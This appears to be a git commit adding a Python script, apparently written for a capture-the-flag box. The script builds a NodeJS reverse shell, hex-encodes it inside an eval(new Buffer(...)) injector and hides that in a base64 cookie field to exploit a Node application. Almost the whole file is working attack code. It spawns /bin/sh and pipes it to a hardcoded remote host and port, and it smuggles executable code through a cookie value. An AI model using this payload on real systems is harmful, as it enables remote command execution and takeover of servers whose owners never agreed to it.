5c5cc5eeb31f11f15b6c72200a0f06645d10b304
c0llision <0xmw@protonmail.com>
2018-04-06 04:08:19 +0100

    init

---
+++ nodejs.py
@@ -0,0 +1,57 @@
+#!/usr/bin/python
+# Generator for encoded NodeJS reverse shells
+# Based on the NodeJS reverse shell by Evilpacket
+# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
+# Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)
+# Insecurety Research (2013) - insecurety.net
+import sys
+import base64
+
+
+
+
+def charencode(string):
+    """String.CharCode"""
+    encoded = ''
+    for char in string:
+        encoded = encoded + "," + str(ord(char))
+    return encoded[1:]
+
+IP_ADDR='10.10.14.75'
+PORT='8112'
+
+NODEJS_REV_SHELL = '''
+var net = require('net');
+var spawn = require('child_process').spawn;
+HOST="%s";
+PORT="%s";
+TIMEOUT="5000";
+if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
+function c(HOST,PORT) {
+    var client = new net.Socket();
+    client.connect(PORT, HOST, function() {
+        var sh = spawn('/bin/sh',[]);
+        client.write("Connected!\\n");
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+        sh.on('exit',function(code,signal){
+          client.end("Disconnected!\\n");
+        });
+    });
+    client.on('error', function(e) {
+        setTimeout(c(HOST,PORT), TIMEOUT);
+    });
+}
+c(HOST,PORT);
+''' % (IP_ADDR, PORT)
+payload = NODEJS_REV_SHELL
+payload = payload.encode('hex')
+injector = "eval(new Buffer('%s', 'hex').toString());//" % payload
+cookie = '{"username":"admin","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"%s"}' % injector
+
+cookie = base64.b64encode(cookie)
+print(cookie)
+
+#PAYLOAD = charencode("eval('2+2+');")
+#print "eval(String.fromCharCode(%s))" % (PAYLOAD)
